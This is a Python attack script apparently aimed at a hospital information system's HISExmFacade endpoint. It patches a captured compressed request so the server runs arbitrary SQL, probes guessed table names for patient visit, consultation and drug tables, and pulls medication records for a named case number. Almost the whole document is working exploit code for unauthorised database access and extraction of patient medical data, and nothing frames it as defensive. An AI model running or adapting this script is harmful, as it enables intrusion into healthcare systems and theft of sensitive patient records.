from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

# Probe guessed table names
probes = [
    'SYSTEM.PAT_OPD_CASE',
    'SYSTEM.PAT_OPD_VISIT',
    'SYSTEM.PAT_OPD_HISTORY',
    'SYSTEM.CONSULTATION',
    'OPDUSR.CONSULTATION',
    'CPOE.CONSULTATION',
    'SYSTEM.PAT_ADM_DRUG',
    'OPDUSR.PAT_ADM_DRUG',
    'SYSTEM.PAT_ADM_CONSULTATION',
    'OPDUSR.OPD_PAT_CASE',
    'OPDUSR.OPDORDM' # Known working
]

for p in probes:
    print(f"[*] Probing {p}...")
    try:
        res = execute_sql(f"SELECT * FROM {p} WHERE ROWNUM <= 1")
        if res and '<NewDataSet>' in res:
            print(f"  [+] SUCCESS: {p}")
            rows = parse_rows(res)
            if rows:
                print(f"  [+] Keys: {rows[0].keys()}")
        else:
            print(f"  [-] Failed or empty: {p}")
    except Exception as e:
        print(f"  [-] Error probing {p}: {e}")

# Check medication for a known HCASENO
target_hcaseno = '46769755' # Case 0 for 003380272B (EMG)
print(f"\n[*] Checking medications for HCASENO {target_hcaseno} in OPDORDM...")
q_med = f"SELECT * FROM OPDUSR.OPDORDM WHERE OPDCASENO = '{target_hcaseno}' AND ROWNUM <= 20"
res_med = execute_sql(q_med)
rows_med = parse_rows(res_med)
if rows_med:
    print(f"  [+] Found {len(rows_med)} records in OPDORDM.")
    for r in rows_med[:3]:
        print(f"  Row: {r}")
else:
    print(f"  [-] No records found for HCASENO {target_hcaseno} in OPDORDM.")
